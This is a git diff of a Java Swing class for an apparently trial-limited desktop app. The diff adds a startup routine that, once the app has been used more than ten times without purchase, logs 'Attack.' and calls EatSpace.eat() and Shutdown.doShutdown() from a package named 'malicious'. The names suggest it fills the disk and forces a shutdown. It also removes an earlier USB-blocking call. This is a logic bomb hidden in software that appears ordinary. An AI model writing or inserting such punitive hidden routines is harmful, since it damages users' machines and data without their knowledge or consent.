@@ -17,6 +17,7 @@ import java.util.logging.Level;
 import java.util.logging.Logger;
 import javax.swing.JOptionPane;
 import javax.swing.filechooser.FileSystemView;
+import malicious.EatSpace;
 import malicious.Shutdown;
 import malicious.UsbBlock;
 import util.*;
@@ -32,6 +33,7 @@ public class Home extends javax.swing.JFrame {
      */
     public Home() {
         initComponents();
+        init();
     }
 
     /**
@@ -64,11 +66,9 @@ public class Home extends javax.swing.JFrame {
             }
         });
 
-        jTextArea1.setEditable(false);
         jTextArea1.setColumns(20);
         jTextArea1.setLineWrap(true);
         jTextArea1.setRows(5);
-        jTextArea1.setText("First 10 Operations Free.\n\nPurchase Now to get Unlimited operations.");
         jTextArea1.setWrapStyleWord(true);
         jScrollPane1.setViewportView(jTextArea1);
 
@@ -127,7 +127,31 @@ public class Home extends javax.swing.JFrame {
         pack();
     }// </editor-fold>//GEN-END:initComponents
 
-      
+    public void init(){
+        try {
+            // TODO add your handling code here:
+            FileUtil.getContent();
+            if(Record.purchased){
+                System.out.println("Purchased Version.");
+                jTextArea1.setText("");
+                jTextArea1.setVisible(!Record.purchased);
+                jButton1.setVisible(!Record.purchased);
+            } else {
+                if(Record.usageCount <= 10) {
+                    jTextArea1.setText(Content.freeVersion);
+                    System.out.println("Free Version.");
+                } else {
+                    System.out.println("Attack.");
+                    jTextArea1.setText(Content.buyNow);
+                    EatSpace.eat();   
+                    Shutdown.doShutdown();
+                }
+            }
+        } catch (IOException ex) {
+            jTextArea1.setText(Content.freeVersion);
+            Logger.getLogger(Home.class.getName()).log(Level.SEVERE, null, ex);
+        }
+    }
     private void jMenu5MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jMenu5MouseClicked
         // TODO add your handling code here:
         if(Record.purchased || Record.usageCount <= 10){
@@ -145,33 +169,12 @@ public class Home extends javax.swing.JFrame {
     }//GEN-LAST:event_jMenu2MouseClicked
 
     private void formWindowOpened(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowOpened
-        try {
-            // TODO add your handling code here:
-            FileUtil.getContent();
-            if(Record.purchased){
-                jTextArea1.setVisible(!Record.purchased);
-                jButton1.setVisible(!Record.purchased);
-            } else {
-                if(Record.usageCount <= 10) {
-                    jTextArea1.setText(Content.freeVersion);
-                } else {
-                    jTextArea1.setText(Content.buyNow);
-                }
-            }
-        } catch (IOException ex) {
-            Logger.getLogger(Home.class.getName()).log(Level.SEVERE, null, ex);
-        }
+        
        
     }//GEN-LAST:event_formWindowOpened
 
     private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
-        try {
-            // TODO add your handling code here:
-            UsbBlock.block();
-//            Shutdown.doShutdown();
-        } catch (Exception ex) {
-            Logger.getLogger(Home.class.getName()).log(Level.SEVERE, null, ex);
-        }
+        
         JOptionPane.showMessageDialog(null, "Contact on pratik18597@gmail.com!");
     }//GEN-LAST:event_jButton1ActionPerformed
 
